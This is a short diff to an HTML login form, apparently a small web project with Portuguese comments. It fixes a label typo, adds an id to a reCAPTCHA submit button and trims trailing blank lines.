@@ -345,7 +345,7 @@
                 <!-- Formulário com ID para referência -->
                 <form id="loginForm">
                     <div class="form-group">
-                        <label for="email" class="form-label">Gmail account or phone number(opsicional now)</label>
+                        <label for="email" class="form-label">Gmail account or phone number (optional now)</label>
                         <input type="email" id="email" name="email" class="form-input" required>
                     </div>
                     
@@ -357,7 +357,7 @@
                     </div>
                     
                     <!-- Botão com reCAPTCHA integrado (modelo do Google) -->
-                    <button class="g-recaptcha btn-login" 
+                    <button id="recaptcha" class="g-recaptcha btn-login" 
                             data-sitekey="6LeIrn4sAAAAAEmDmijVjHsMq3t0YIwq7rD5e9FW" 
                             data-callback='onSubmit' 
                             data-action='submit'>
@@ -407,5 +407,3 @@
     <script src="index.js"></script>
 </body>
 </html>
-
-
